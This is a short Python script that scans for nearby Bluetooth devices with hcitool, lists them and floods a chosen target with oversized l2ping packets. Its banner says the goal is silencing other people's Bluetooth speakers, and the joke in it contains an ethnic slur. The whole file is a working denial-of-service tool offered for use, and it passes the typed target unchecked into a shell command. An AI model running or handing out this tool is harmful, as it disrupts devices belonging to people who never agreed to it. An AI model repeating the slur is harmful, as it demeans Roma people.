import os
import subprocess

print("This is a simple python code that runs for you hcitool and l2ping.")
print("""    _   _  _ _____ ___   __  __   _   _  _ ___ _    ___ 
   /_\ | \| |_   _|_ _| |  \/  | /_\ | \| | __| |  | __|
  / _ \| .` | | |  | |  | |\/| |/ _ \| .` | _|| |__| _| 
 /_/ \_\_|\_| |_| |___|_|_|  |_/_/ \_\_|\_|___|____|___|
                     |___|""")
print("(no more romanian gipy songs on bluetooth speakers)JK")
print("made by noobmadman")
print("https://github.com/noobmadman")
accept = input("Do you want to do this: y/n: ").lower()

if accept == "y":
    print("Scanning...")
    output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
    lines = output.splitlines()
    id = 0
    print("Scanned")
elif accept == "n":
    print("Ok man, see ya.")
    exit(0)
else:
    print("You didn't say y or n (abort).")
    exit(0)

print("If you see nothing down here then no device was found.")

id = 0
del lines[0]
array = []
print("|id   |   mac_addres  |   device_name|")
for line in lines:
    info = line.split()
    mac = info[0]
    array.append(mac)
    print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
    id = id + 1

target_id = input('Target id or MAC address > ')

if target_id.isdigit():
    target_id = int(target_id)
    if target_id < len(array):
        target_id = array[target_id]
    else:
        print("Invalid ID.")
        exit(0)

print("")
os.system(f"l2ping -s 600 -f {target_id}")
